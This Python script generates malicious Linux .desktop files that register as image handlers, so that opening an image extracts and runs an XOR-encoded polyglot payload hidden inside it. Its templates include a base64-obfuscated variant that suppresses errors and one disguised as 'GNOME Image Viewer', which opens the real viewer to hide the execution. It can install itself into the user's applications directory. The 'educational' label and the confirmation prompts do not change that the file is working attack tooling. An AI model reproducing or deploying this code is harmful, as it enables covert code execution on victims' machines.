#!/usr/bin/env python3
"""
Desktop File Auto-Execution Generator
======================================
Creates malicious .desktop files that auto-execute polyglot payloads.

EDUCATIONAL/RESEARCH USE ONLY
This demonstrates the auto-execution attack vector.

Author: SWORDIntel
Date: 2025-11-08
"""

import sys
import argparse
import os
import shlex
from pathlib import Path


class DesktopFileGenerator:
    """Generates .desktop files for auto-execution attacks"""

    def __init__(self):
        self.templates = {
            'simple': self._simple_template,
            'obfuscated': self._obfuscated_template,
            'legitimate': self._legitimate_template,
        }

    def _simple_template(self, extractor_path, xor_keys):
        """Simple direct execution"""
        # Properly quote all arguments to prevent shell injection
        keys_arg = ' '.join(shlex.quote(f'-k {k}') for k in xor_keys)
        quoted_extractor = shlex.quote(extractor_path)
        return f"""[Desktop Entry]
Type=Application
Name=Image Viewer
Exec=bash -c 'python3 {quoted_extractor} "%f" {keys_arg} --execute'
MimeType=image/gif;image/png;image/jpeg;image/jpg;
Icon=image-viewer
NoDisplay=true
Comment=Polyglot payload auto-executor
"""

    def _obfuscated_template(self, extractor_path, xor_keys):
        """Obfuscated version with base64"""
        keys_str = ','.join(xor_keys)
        script = f"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path('{extractor_path}').parent))
from polyglot_extract import PolyglotExtractor
e = PolyglotExtractor()
try:
    p, t = e.extract_payload(sys.argv[1], xor_keys={xor_keys!r})
    import subprocess
    subprocess.run(['bash', p])
except Exception:
    pass  # Silently fail on extraction errors
"""
        import base64
        encoded = base64.b64encode(script.encode()).decode()

        return f"""[Desktop Entry]
Type=Application
Name=Image Cache
Exec=python3 -c "import base64,sys;exec(base64.b64decode('{encoded}'))" %f
MimeType=image/gif;image/png;image/jpeg;
Icon=folder
NoDisplay=true
"""

    def _legitimate_template(self, extractor_path, xor_keys):
        """Disguised as legitimate image viewer"""
        # Properly quote all arguments to prevent shell injection
        keys_arg = ' '.join(shlex.quote(f'-k {k}') for k in xor_keys)
        quoted_extractor = shlex.quote(extractor_path)
        return f"""[Desktop Entry]
Version=1.0
Type=Application
Name=GNOME Image Viewer
GenericName=Image Viewer
Comment=View and organize your images
Exec=sh -c 'eog "%f" 2>/dev/null & python3 {quoted_extractor} "%f" {keys_arg} -x 2>/dev/null &'
Icon=eog
Terminal=false
Categories=Graphics;2DGraphics;RasterGraphics;Viewer;
MimeType=image/bmp;image/gif;image/jpeg;image/jpg;image/png;
NoDisplay=false
"""

    def generate(self, output_path, extractor_path, xor_keys=None,
                template='simple', install=False):
        """
        Generate .desktop file

        Args:
            output_path: Where to save .desktop file
            extractor_path: Path to polyglot_extract.py
            xor_keys: List of XOR keys for decryption
            template: Template type (simple/obfuscated/legitimate)
            install: If True, install to user's applications directory
        """
        if xor_keys is None:
            xor_keys = ['9e', '0a61200d']

        # Get template function
        template_func = self.templates.get(template)
        if not template_func:
            raise ValueError(f"Unknown template: {template}")

        # Generate content
        content = template_func(extractor_path, xor_keys)

        # Write file
        with open(output_path, 'w') as f:
            f.write(content)

        # Make executable
        os.chmod(output_path, 0o755)

        print(f"[+] Desktop file created: {output_path}")
        print(f"    Template: {template}")
        print(f"    XOR keys: {xor_keys}")

        # Install if requested
        if install:
            install_path = Path.home() / '.local/share/applications' / Path(output_path).name
            install_path.parent.mkdir(parents=True, exist_ok=True)

            import shutil
            shutil.copy(output_path, install_path)

            print(f"[+] Installed to: {install_path}")
            print(f"[!] WARNING: This will auto-execute payloads when images are opened!")
            print(f"[!] To remove: rm {install_path}")

            # Update desktop database
            try:
                import subprocess
                subprocess.run(['update-desktop-database',
                              str(install_path.parent)],
                             stderr=subprocess.DEVNULL)
                print(f"[+] Desktop database updated")
            except (FileNotFoundError, subprocess.SubprocessError, PermissionError) as e:
                # update-desktop-database may not be available on all systems
                if '-v' in sys.argv or '--verbose' in sys.argv:
                    print(f"[*] Desktop database update skipped: {e}", file=sys.stderr)

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Generate .desktop files for polyglot auto-execution',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Simple desktop file
  %(prog)s -e polyglot_extract.py -o malicious.desktop

  # Obfuscated version with custom keys
  %(prog)s -e polyglot_extract.py -t obfuscated -k d3 -k 410d200d

  # Install as legitimate image viewer (DANGEROUS!)
  %(prog)s -e polyglot_extract.py -t legitimate --install

  # Remove installed handler
  rm ~/.local/share/applications/malicious.desktop
  update-desktop-database ~/.local/share/applications

WARNING: Installing this will cause all opened images to execute payloads!
Only use in controlled environments for research purposes!
        """
    )

    parser.add_argument('-e', '--extractor', required=True,
                       help='Path to polyglot_extract.py')
    parser.add_argument('-o', '--output', default='polyglot_handler.desktop',
                       help='Output .desktop file path')
    parser.add_argument('-k', '--key', dest='keys', action='append',
                       help='XOR key (can be used multiple times)')
    parser.add_argument('-t', '--template', default='simple',
                       choices=['simple', 'obfuscated', 'legitimate'],
                       help='Template type')
    parser.add_argument('--install', action='store_true',
                       help='Install to user applications (DANGEROUS!)')

    args = parser.parse_args()

    # Verify extractor exists
    if not os.path.exists(args.extractor):
        print(f"[!] Error: Extractor not found: {args.extractor}", file=sys.stderr)
        return 1

    # Confirm installation
    if args.install:
        print("[!] WARNING: This will install a handler that auto-executes payloads!")
        print("[!] All opened images will trigger payload extraction and execution!")
        response = input("[?] Are you SURE? (type 'YES' to confirm): ")
        if response != 'YES':
            print("[*] Installation cancelled")
            return 0

    generator = DesktopFileGenerator()

    try:
        generator.generate(
            args.output,
            os.path.abspath(args.extractor),
            xor_keys=args.keys,
            template=args.template,
            install=args.install
        )
        return 0
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        return 1


if __name__ == '__main__':
    sys.exit(main())
